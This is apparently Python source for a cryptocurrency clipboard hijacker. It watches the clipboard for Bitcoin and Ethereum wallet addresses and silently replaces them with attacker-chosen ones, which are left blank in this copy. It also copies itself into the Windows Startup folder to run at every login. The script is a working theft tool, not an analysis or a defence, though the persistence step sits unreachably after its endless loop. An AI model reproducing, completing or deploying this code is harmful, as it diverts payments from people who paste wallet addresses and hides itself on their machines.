import os
import subprocess
import sys

def install_pyperclip():
    # Change python_path to point to the portable Python executable
    python_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ppython", "App", "Python", "python.exe")
    
    # Check if pip is installed
    pip_check = subprocess.run([python_path, "-m", "pip", "--version"], capture_output=True, text=True)
    
    # If pip is not installed, add the pip files to the Python environment
    if "not found" in pip_check.stderr:
        ppython_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ppython")
        sys.path.append(ppython_path)

    # Install pyperclip
    subprocess.run([python_path, "-m", "pip", "install", "pyperclip"])

import pyperclip
import shutil
import random
import os

# Define the target addresses
btc_addresses = {
    "1": "",
    "bc1": "",
    "3": ""
}

eth_addresses = ["", "", ""]

def replace_address():
    current_address = pyperclip.paste().strip()
    if current_address.startswith("1") or current_address.startswith("bc1") or current_address.startswith("3"):
        if current_address in btc_addresses.values():
            return
        else:
            for prefix, target_address in btc_addresses.items():
                if current_address.startswith(prefix):
                    pyperclip.copy(target_address)
                    print(f"BTC address replaced: {current_address} -> {target_address}")
                    return
    elif current_address.startswith("0x"):
        if current_address in eth_addresses:
            return
        else:
            import random
            new_address = random.choice(eth_addresses)
            pyperclip.copy(new_address)
            print(f"ETH address replaced: {current_address} -> {new_address}")

while True:
    try:
        current_address = pyperclip.paste().strip()
        if current_address.startswith("1") or current_address.startswith("bc1") or current_address.startswith("3") or current_address.startswith("0x"):
            replace_address()
    except KeyboardInterrupt:
        break

# Save the current script path
script_path = os.path.abspath(sys.argv[0])

# Specify the new folder path in the user's AppData folder
user_dir = os.path.expanduser('~')
new_folder_path = os.path.join(user_dir, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

# Create the new folder if it doesn't exist
os.makedirs(new_folder_path, exist_ok=True)

# Copy the script to the new folder
new_script_path = os.path.join(new_folder_path, os.path.basename(script_path))
shutil.copy(script_path, new_script_path)
